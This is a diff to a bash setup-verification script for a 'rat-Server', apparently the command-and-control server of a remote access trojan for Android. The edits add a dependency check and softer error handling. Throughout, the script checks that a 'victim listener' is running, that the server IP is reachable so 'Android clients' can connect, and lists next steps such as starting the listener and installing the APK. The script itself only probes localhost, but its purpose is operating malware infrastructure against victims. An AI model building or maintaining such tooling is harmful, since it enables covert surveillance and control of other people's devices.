@@ -3,6 +3,7 @@
 # Server Setup Verification Script
 # This script helps verify that the rat-Server is properly configured and accessible
 
+# Note: Using set -e but with explicit error handling for optional checks
 set -e
 
 # Colors for output
@@ -18,7 +19,7 @@ echo -e "${BLUE}========================================${NC}"
 echo ""
 
 # Check if config.json exists
-echo -e "${YELLOW}[1/6] Checking config.json...${NC}"
+echo -e "${YELLOW}[1/7] Checking config.json...${NC}"
 if [ ! -f "rat-Server/config.json" ]; then
     echo -e "${RED}✗ config.json not found!${NC}"
     echo "Please create rat-Server/config.json with SERVER_IP and SERVER_PORT"
@@ -34,37 +35,58 @@ echo "  SERVER_IP: $SERVER_IP"
 echo "  SERVER_PORT: $SERVER_PORT"
 echo ""
 
+# Check if node_modules exists
+echo -e "${YELLOW}[2/7] Checking dependencies...${NC}"
+if [ ! -d "rat-Server/node_modules" ]; then
+    echo -e "${RED}✗ Dependencies not installed${NC}"
+    echo "Run: cd rat-Server && npm install"
+    exit 1
+fi
+echo -e "${GREEN}✓ Dependencies are installed${NC}"
+echo ""
+
 # Check if main server is running (port 3000)
-echo -e "${YELLOW}[2/6] Checking main server (port 3000)...${NC}"
+echo -e "${YELLOW}[3/7] Checking main server (port 3000)...${NC}"
+# Disable set -e for this check as we want to handle the error gracefully
+set +e
 if nc -z localhost 3000 2>/dev/null || lsof -i :3000 >/dev/null 2>&1; then
     echo -e "${GREEN}✓ Main server is running on port 3000${NC}"
+    SERVER_RUNNING=true
 else
     echo -e "${RED}✗ Main server is not running on port 3000${NC}"
     echo "Start the server with: cd rat-Server && node server.js"
-    exit 1
+    SERVER_RUNNING=false
 fi
+set -e
 echo ""
 
-# Test config endpoint
-echo -e "${YELLOW}[3/6] Testing /api/config endpoint...${NC}"
-if command -v curl &> /dev/null; then
-    RESPONSE=$(curl -s http://localhost:3000/api/config 2>/dev/null || echo "ERROR")
-    if [ "$RESPONSE" != "ERROR" ]; then
-        echo -e "${GREEN}✓ Config endpoint is accessible${NC}"
-        echo "  Response: $RESPONSE"
+# Test config endpoint (only if server is running)
+echo -e "${YELLOW}[4/7] Testing /api/config endpoint...${NC}"
+if [ "$SERVER_RUNNING" = true ]; then
+    if command -v curl &> /dev/null; then
+        set +e
+        RESPONSE=$(curl -s http://localhost:3000/api/config 2>/dev/null || echo "ERROR")
+        set -e
+        if [ "$RESPONSE" != "ERROR" ]; then
+            echo -e "${GREEN}✓ Config endpoint is accessible${NC}"
+            echo "  Response: $RESPONSE"
+        else
+            echo -e "${RED}✗ Config endpoint is not accessible${NC}"
+        fi
     else
-        echo -e "${RED}✗ Config endpoint is not accessible${NC}"
-        exit 1
+        echo -e "${YELLOW}⚠ curl not found, skipping endpoint test${NC}"
     fi
 else
-    echo -e "${YELLOW}⚠ curl not found, skipping endpoint test${NC}"
+    echo -e "${YELLOW}⚠ Skipping (server not running)${NC}"
 fi
 echo ""
 
 # Check if victim listener is running
-echo -e "${YELLOW}[4/6] Checking victim listener (port $SERVER_PORT)...${NC}"
+echo -e "${YELLOW}[5/7] Checking victim listener (port $SERVER_PORT)...${NC}"
+set +e
 if nc -z localhost $SERVER_PORT 2>/dev/null || lsof -i :$SERVER_PORT >/dev/null 2>&1; then
     echo -e "${GREEN}✓ Victim listener is running on port $SERVER_PORT${NC}"
+    LISTENER_RUNNING=true
 else
     echo -e "${YELLOW}⚠ Victim listener is NOT running on port $SERVER_PORT${NC}"
     echo "  This is required for Android clients to connect!"
@@ -75,11 +97,13 @@ else
     echo "    -d '{\"port\": $SERVER_PORT}'"
     echo ""
     echo -e "${YELLOW}  Or use the web UI at http://localhost:3000 → Victims Lab → Start Listening${NC}"
+    LISTENER_RUNNING=false
 fi
+set -e
 echo ""
 
 # Check network accessibility
-echo -e "${YELLOW}[5/6] Checking network accessibility...${NC}"
+echo -e "${YELLOW}[6/7] Checking network accessibility...${NC}"
 if [ "$SERVER_IP" = "localhost" ] || [ "$SERVER_IP" = "127.0.0.1" ]; then
     echo -e "${RED}✗ SERVER_IP is set to localhost/127.0.0.1${NC}"
     echo "  Android clients won't be able to reach the server!"
@@ -95,7 +119,7 @@ fi
 echo ""
 
 # Summary
-echo -e "${YELLOW}[6/6] Summary${NC}"
+echo -e "${YELLOW}[7/7] Summary${NC}"
 echo "─────────────────────────────────────────"
 echo "Main Server:"
 echo "  • Web UI: http://localhost:3000"
@@ -103,7 +127,7 @@ echo "  • Config API: http://localhost:3000/api/config"
 echo ""
 echo "Victim Listener:"
 echo "  • Port: $SERVER_PORT"
-if nc -z localhost $SERVER_PORT 2>/dev/null || lsof -i :$SERVER_PORT >/dev/null 2>&1; then
+if [ "$LISTENER_RUNNING" = true ]; then
     echo "  • Status: Running ✓"
 else
     echo "  • Status: Not started ✗"
@@ -114,7 +138,11 @@ echo "  • Will fetch: http://$SERVER_IP:3000/api/config"
 echo "  • Will connect to: http://$SERVER_IP:$SERVER_PORT"
 echo ""
 echo "Next Steps:"
-if ! (nc -z localhost $SERVER_PORT 2>/dev/null || lsof -i :$SERVER_PORT >/dev/null 2>&1); then
+if [ "$SERVER_RUNNING" = false ]; then
+    echo "  1. Install dependencies: cd rat-Server && npm install"
+    echo "  2. Start the server: node server.js"
+fi
+if [ "$LISTENER_RUNNING" = false ] && [ "$SERVER_RUNNING" = true ]; then
     echo "  1. Start the victim listener (see above)"
 fi
 echo "  2. Build or install the Android APK"
